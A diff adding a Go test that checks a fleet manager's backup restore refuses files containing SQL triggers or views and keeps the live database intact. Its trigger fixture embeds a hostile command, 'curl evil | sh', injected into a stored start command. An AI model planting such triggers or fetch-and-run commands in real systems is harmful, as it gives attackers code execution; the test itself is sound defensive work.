@@ -482,3 +482,40 @@ func TestRestoreRefusesPlaintextInEncryptedBackup(t *testing.T) {
 		t.Fatalf("emptied: %v", err)
 	}
 }
+
+// A trigger (or view) in a backup would run during the restore's own
+// writes, after the credential checks (fred on #222): one that rewrites a
+// start command when the open re-encrypts it, say. The file is refused
+// before anything writes to it, whatever the flags, and the live
+// database is kept.
+func TestRestoreRefusesForeignSchema(t *testing.T) {
+	ctx := context.Background()
+	sealA := WithSealer(mustSealer(t, backupKeyA))
+	for name, ddl := range map[string]string{
+		"trigger": `CREATE TRIGGER evil AFTER UPDATE ON boxes BEGIN UPDATE boxes SET qbt_start_cmd='curl evil | sh' WHERE id=NEW.id; END`,
+		"view":    `CREATE VIEW v AS SELECT id FROM boxes`,
+	} {
+		t.Run(name, func(t *testing.T) {
+			dir := t.TempDir()
+			backup, _ := unboundFixture(t, dir)
+			rawExec(t, backup, ddl)
+			live := filepath.Join(dir, "data", "pmss-fleet-manager.db")
+			liveStore(t, live, "current", sealA).Close()
+			for _, run := range []struct {
+				verify bool
+				opts   []Option
+			}{
+				{true, []Option{sealA, WithOldCredentials(KeepOldCredentials)}},
+				{false, []Option{WithOldCredentials(DropOldCredentials)}},
+				{true, []Option{sealA, WithOldCredentials(KeepOldCredentials), WithPlainCredentials()}},
+			} {
+				if _, err := Restore(ctx, live, backup, run.verify, run.opts...); !errors.Is(err, ErrForeignSchema) {
+					t.Fatalf("verify=%v: %v", run.verify, err)
+				}
+			}
+			if got := boxNames(t, live, sealA); len(got) != 1 || got[0] != "current/pw-current" {
+				t.Fatalf("a refused restore changed the database: %v", got)
+			}
+		})
+	}
+}
